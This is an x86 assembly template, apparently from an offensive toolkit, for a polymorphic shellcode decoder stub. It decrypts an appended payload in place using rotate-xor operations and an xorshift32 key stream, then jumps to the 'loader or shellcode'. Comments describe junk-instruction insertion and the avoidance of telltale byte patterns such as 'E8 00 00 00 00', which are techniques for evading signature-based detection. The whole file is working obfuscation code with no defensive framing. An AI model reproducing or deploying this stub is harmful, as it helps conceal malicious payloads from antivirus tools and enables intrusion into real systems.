.code32

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// eax store the random seed
// ebx store the crypto key
// ecx store the loop times
// edx store the xor shift median
// esi store the body address
// edi store the current value

header:
  // save context
  pushad                                       {{iji}}
  pushfd                                       {{iji}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{iji}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // for prevent "E8 00 00 00 00"
  call calc_body_addr
 flag_CEA:                                              {{iji}}
  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{iji}}
  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{iji}}
  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{iji}}

  // decode shellcode body
 loop_xor:
  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{ijs}}
  ror {{.Reg.edi}}, 5                          {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{ijs}}
  rol {{.Reg.edi}}, 17                         {{ijs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{ijs}}
  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{ijs}}

  // call xor shift 32
  jmp xor_shift_32                             {{ijs}}
 ret_1:

  // update address and counter
  add {{.Reg.esi}}, 4                          {{ijs}}
  dec {{.Reg.ecx}}                             {{ijs}}
  jnz loop_xor                                 {{ijs}}

  // restore context
  popfd                                        {{iji}}
  popad                                        {{iji}}

  // jump to the padding junk instruction
  jmp padding                                  {{iji}}

xor_shift_32:
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shl {{.Reg.edx}}, 13                         {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shr {{.Reg.edx}}, 17                         {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{ijs}}
  shl {{.Reg.edx}}, 5                          {{ijs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{ijs}}
  jmp ret_1                                    {{ijs}}

padding:
{{if .Padding}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
  {{iji}}  {{iji}}  {{iji}}  {{iji}}
{{end}}

  // jump to the loader or shellcode
  jmp body                                     {{ijs}}

{{if .Padding}}
  {{db .PadData}}
{{end}}

calc_body_addr:
  pop  {{.Reg.esi}}                            {{iji}}
  push {{.Reg.esi}}                            {{iji}}
  ret                                          {{iji}}

body:
